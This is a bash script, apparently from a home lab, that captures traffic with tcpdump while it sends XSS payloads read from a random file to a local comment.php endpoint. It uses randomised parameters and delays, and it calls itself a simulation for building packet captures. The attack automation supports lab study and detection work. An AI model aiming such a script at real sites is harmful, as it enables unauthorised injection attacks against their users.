#!/bin/bash

TARGET="http://192.168.10.3/comment.php"
INTERFACE="eth0"
PCAP_FILE="/home/kali/GNS3/pcap/xss_attack_$(date +%Y%m%d_%H%M%S).pcap"

XSS_FOLDER="/home/kali/GNS3/XSS"
XSS_FILE=$(find "$XSS_FOLDER" -type f -name "*.txt" | shuf -n 1)

if [ ! -f "$XSS_FILE" ]; then
  echo "No XSS payload file found in $XSS_FOLDER"
  exit 1
fi

echo "Starting tcpdump..."
sudo tcpdump -i "$INTERFACE" host 192.168.10.3 -w "$PCAP_FILE" &
TCPDUMP_PID=$!

while IFS= read -r payload || [ -n "$payload" ]; do
  [ -z "$payload" ] && continue

  RANDOM_PARAM=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 5)
  ENCODED_PAYLOAD=$(printf "%s" "$payload" | jq -s -R -r @uri)

  echo "Sending payload: $payload"
  curl -s "$TARGET?comment=$ENCODED_PAYLOAD&rand=$RANDOM_PARAM" > /dev/null

  # Random delay between 1-5 seconds
  DELAY=$((RANDOM % 5 + 1))
  echo "Sleeping for $DELAY seconds..."
  sleep "$DELAY"

done < "$XSS_FILE"

kill "$TCPDUMP_PID"
echo "XSS simulation complete. PCAP saved to $PCAP_FILE"